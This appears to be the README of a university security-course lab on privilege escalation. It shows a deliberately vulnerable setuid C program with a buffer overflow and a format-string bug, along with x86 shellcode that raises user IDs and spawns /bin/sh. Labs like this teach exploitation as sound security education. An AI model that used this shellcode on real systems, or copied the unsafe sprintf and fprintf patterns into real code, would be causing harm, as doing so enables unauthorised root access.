# Language-Based-Security
Repository of the exercises and the project of the Chalmers Language-Based Security Course.

##Introduction
The purpose of this lab is to show how a vulnerability in a program can be exploited to provide an attacker with a shell running with elevated rights.

In this lab, you are given a source of a vulnerable program that is installed on the system. This program has the user set-ID(s) bit set, which means that upon execution the proram will right with the rights of the owner of the file and not the right of the current user. The real user ID will still be the ID of the current user, but the effective user ID will be that of the owner of the file. For example, a shell with the s bit set will be executed with the rights of the owner of the program file.

______________________________________________________________________________________________________________________

##The vulnerable program
The vulnerable program addhostalias is used for adding entries to the hosts file of the user. The source code of the program is also included in the virtual machine for reference.

```C
#include <stdio.h>
#include <stdlib.h>
 
 
#define HOSTNAMELEN 256
#define IPADDR      1
#define HOSTNAME    2
#define ALIAS       3
 
#define HOSTFILE "/home/r00t/hosts"
 
 
void add_alias(char *ip, char *hostname, char *alias) {
  char formatbuffer[256];
  FILE *file;
 
  sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias);
 
  file = fopen(HOSTFILE, "a");
  if (file == NULL) {
    perror("fopen");
    exit(EXIT_FAILURE);
  }
 
  fprintf(file, formatbuffer);
  if (fclose(file) != 0) {
    perror("close");
    exit(EXIT_FAILURE);
  }
}
 
 
int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: %s ipaddress hostname alias \n", argv[0]);
    exit(EXIT_FAILURE);
  }
 
  add_alias(argv[IPADDR], argv[HOSTNAME], argv[ALIAS]);
  return(0);
}
```

This program is compiled and has set-uid flag of the user r00t

```ShellSession
ls -l /usr/bin/addhostalias
-rwsr-xr-x    1 r00t     r00t        14512 Apr  5 11:48 /usr/bin/addhostalias
```

______________________________________________________________________________________________________________________

##Shellcode
The following shellcode is useful to build a buffer overrun. It avoids nul-characters, and fits in the buffer in the vulnerable program. This file, and a Python/Perl compatible version are included in the virtual machine.

```ShellSession
#ifndef _SHELLCODE_H 
#define _SHELLCODE_H 

static char shellcode[] = 
"\xb9\xff\xff\xff\xff" 
"\x31\xc0" //sets real user id from effective user id. 
"\xb0\x31" 
"\xcd\x80" 


"\x89\xc3" // copy the value to ebx 
"\x31\xc0" 
"\xb0\x46" 
"\xcd\x80" 

"\x31\xc0" 
"\xb0\x32" 
"\xcd\x80" 


"\x89\xc3" 
"\xb0\x31" 
"\xb0\x47" //sets real group id from effective user id. 
"\xcd\x80" 

"\x31\xc0" 
"\x31\xd2" 
"\x52" 
"\x68\x2f\x2f\x73\x68" 
"\x68\x2f\x62\x69\x6e" 
"\x89\xe3" 
"\x52" 
"\x53" 
"\x89\xe1" 
"\xb0\x0b" 
"\xcd\x80" 
"\x31\xc0" 
"\x40" 
"\xcd\x80"; 

#endif /* _SHELLCODE_H */
```